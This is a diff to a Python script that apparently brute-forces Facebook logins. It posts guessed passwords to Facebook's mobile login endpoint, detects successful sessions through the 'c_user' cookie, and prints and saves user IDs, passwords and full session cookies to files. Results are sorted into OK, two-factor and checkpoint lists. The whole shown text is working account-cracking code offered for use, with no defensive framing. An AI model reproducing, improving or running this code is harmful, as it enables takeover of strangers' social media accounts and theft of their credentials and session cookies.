@@ -319,19 +319,39 @@ def rcrack1(uid,pwx,tl):
             'user-agent': pro,}
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&rtime=1688798944&subno_key=AaFb0noI16IB3EMVYb2ANuD6yQ-8uv1gStpS0z-GrmMw5w92-JdSau41RU8b2yutv4oRCgp7hUz0IkhhlMCWF_BzUD5g4o9xW5c2M_B8BxQOuHUme57GxUv-bJUoZZr7WVv7rFe4vTo5IFAA4DfK8gNgqJnbxFVVkOY6uO0JThl_UAP9EreQ-fxWQ_c3hNU2WTVBulMunW-wswY02inFmmHTv15qbpZScqtWMa6H_5-ZbK8OgW-UaYz85I1Zbp7MKx_ZEpABBdYfLMV1ocmEoFgMj7yL28F-AsZFLh5WsRWE0w5D0XX9rSynNsD1WIazEp4&hrc=1&wtsid=rdr_0sMCjCHwvMmxopE1t&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = "1000"+coki1[0:11]
-				print('\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
-				cek_apk(session,coki)
-				open('JIBON-OK.txt', 'a').write(cid+' | '+ps+'\n')
-				ok.append(uid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-print('chk update')
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                uid = "1000"+coki1[0:11]
+                #os.system("play-audio JIBON_OK.mp3")
+                print(f'\33[1;92m[JIBON-OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f" Cookie : {coki}")
+                cek_apk(session,coki)
+                open('/sdcard/ MRX-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                ok.append(uid)
+            elif 'checkpoint' in log_cookies:
+                if 'Enter login code to continue' in log_cookies:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    coki1 = coki.split("1000")[1]
+                    uid = "1000"+coki1[0:11]
+                    #os.system("play-audio JIBON_2F.mp3")
+                    print('\r\x1b[38;5;45m[JIBON-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
+                    open('/sdcard/MRX-2F.txt', 'a').write(uid+' | '+ps+'\n')
+                    twf.append(uid)
+                else:
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    coki1 = coki.split("1000")[1]
+                    uid = "1000"+coki1[0:11]
+                  #  os.system("play-audio JIBON_CP.mp3")
+                    print(f'\33[1;91m[JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
+                    open('/sdcard/MRX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    cp.append(uid)
+                    break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f' \r\033[m[ JIBON ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
 Mrx()
